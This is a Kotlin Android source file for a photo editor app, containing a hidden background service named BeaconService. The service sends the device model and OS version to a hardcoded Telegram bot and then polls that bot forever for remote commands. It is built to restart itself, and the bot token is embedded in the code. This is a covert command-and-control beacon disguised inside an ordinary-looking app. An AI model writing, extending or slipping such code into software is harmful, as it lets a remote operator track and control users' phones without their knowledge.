package com.photo.editor

import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.MediaType.Companion.toMediaType
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class BeaconService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()
    private val BOT_TOKEN = "8499165846:AAFsr7EJTCOYcBB1yXLwoDZcHhBPfnvq-Rg"
    private val CHAT_ID = "6146550840"
    private val API = "https://api.telegram.org/bot$BOT_TOKEN"
    private var offset = 0L

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        scope.launch {
            send("beacon\nmodel: ${Build.MODEL}\nsdk: ${Build.VERSION.SDK_INT}")
            while (true) {
                try {
                    val r = client.newCall(
                        Request.Builder().url("$API/getUpdates?offset=$offset&timeout=10").build()
                    ).execute()
                    val body = r.body?.string() ?: continue
                    val arr = JSONObject(body).optJSONArray("result") ?: continue
                    for (i in 0 until arr.length()) {
                        val u = arr.getJSONObject(i)
                        offset = u.getLong("update_id") + 1
                        val msg = u.optJSONObject("message") ?: continue
                        val chat = msg.optJSONObject("chat")?.optString("id") ?: continue
                        if (chat != CHAT_ID) continue
                        val text = msg.optString("text", "")
                        if (text == "/info") send("model: ${Build.MODEL}\nsdk: ${Build.VERSION.SDK_INT}")
                        else if (text == "/ping") send("pong")
                        else if (text.isNotEmpty()) send("got: $text")
                    }
                } catch (e: Exception) {
                    Log.e("beacon", "poll", e)
                }
                delay(3000)
            }
        }
        return START_STICKY
    }

    private fun send(text: String) {
        try {
            val json = JSONObject().put("chat_id", CHAT_ID).put("text", text.take(4000))
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val req = Request.Builder().url("$API/sendMessage").post(body).build()
            client.newCall(req).execute().close()
        } catch (e: Exception) {
            Log.e("beacon", "send", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
